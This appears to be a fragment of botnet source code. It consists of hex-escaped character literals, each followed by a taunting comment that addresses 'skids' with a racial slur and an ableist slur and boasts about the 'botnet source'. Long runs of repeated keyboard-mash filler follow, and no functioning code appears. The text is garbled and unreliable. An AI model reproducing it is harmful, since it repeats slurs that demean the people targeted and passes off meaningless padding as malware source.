    "\x73","\x74","\x75","\x76","\x77","\x78","\x79",//random sting decision//GET THE FOCK OUTA HERE SKID RETARD ASS NIGGER MY BOTYNET SOURCE IS TO GODLY GFIUOEFASHF98UHES9UGHRS97BGHFDBVU97PHBVGUI9PHRWIPUBVHRSIOUPGBHIOPUSFDNHBVIUJFDSNBHVIUSRipuyvbriswpunbvihsrbviuybsriubviursbviubriuvbisrbvirswbvirwsbviyubrwiyvbwrivbirwbvirwbiuribirwbiwrsiurwiurnupiosbGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UG
    "\x7a","\x7b","\x7c","\x7d","\x7e","\x7f","\x80",//random sting decision//GET THE FOCK OUTA HERE SKID RETARD ASS NIGGER MY BOTYNET SOURCE IS TO GODLY GFIUOEFASHF98UHES9UGHRS97BPHBVGUI9PHRWIPUBVHRSIOUPGBHIOPUSFDNHBVIUJFDSNBHVIUSRipuyvbriswpunbvihsrbviuybsriubviursbviubriuvbisrbvirswbvirwsbviyubrwiyvbwrivbirwbvirwbiuribirwbiwrsiurwiurnupiosbGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UG
    "\x81","\x82","\x83","\x84","\x85","\x86","\x87",//random sting decision//GET THE FOCK OUTA HERE SKID RETARD ASS NIGGER MY BOTYNET SOURCE IS TO GODLY GFIUOEFASHF98UHES9UGHRS97BPHBVGUI9PHRWIPUBVHRSIOUPGBHIOPUSFDNHBVIUJFDSNBHVIUSRipuyvbriswpunbvihsrbviuybsriubviursbviubriuvbisrbvirswbvirwsbviyubrwiyvbwrivbirwbvirwbiuribirwbiwrsiurwiurnupiosbGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UG
    "\x88","\x89","\x8a","\x8b","\x8c","\x8d","\x8e",//random sting decision//GET THE FOCK OUTA HERE SKID RETARD ASS NIGGER MY BOTYNET SOURCE IS TO GODLY GFIUOEFASHF98UHES9UGHRS97BPHBVGUI9PHRWIPUBVHRSIOUPGBHIOPUSFDNHBVIUJFDSNBHVIUSRipuyvbriswpunbvihsrbviuybsriubviursbviubriuvbisrbvirswbvirwsbviyubrwiyvbwrivbirwbvirwbiuribirwbiwrsiurwiurnupiosbGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UG
    "\x8f","\x90","\x91","\x92","\x93","\x94","\x95",//random sting decision//GET THE FOCK OUTA HERE SKID RETARD ASS NIGGER MY BOTYNET SOURCE IS TO GODLY GFIUOEFASHF98UHES9UHRS97BUHFDBVU97PHBVGUI9PHRWIPUBVHRSIOUPGBHIOPUSFDNHBVIUJFDSNBHVIUSRipuyvbriswpunbvihsrbviuybsriubviursbviubriuvbisrbvirswbvirwsbviyubrwiyvbwrivbirwbvirwbiuribirwbiwrsiurwiurnupiosbGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UG
    "\x96","\x97","\x98","\x99","\x9a","\x9b","\x9c",//random sting decision//GET THE FOCK OUTA HERE SKID RETARD ASS NIGGER MY BOTYNET SOURCE IS TO GODLY GFIUOEFASHF98UHES9UGHRS97BUP0\GHFDBVU97PHBVGUI9PHRWIPUBVHRSIOUPGBHIOPUSFDNHBVIUJFDSNBHVIUSRipuyvbriswpunbvihsrbviuybsriubviursbviubriuvbisrbvirswbvirwsbviyubrwiyvbwrivbirwbvirwbiuribirwbiwrsiurwiurnupiosbGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFA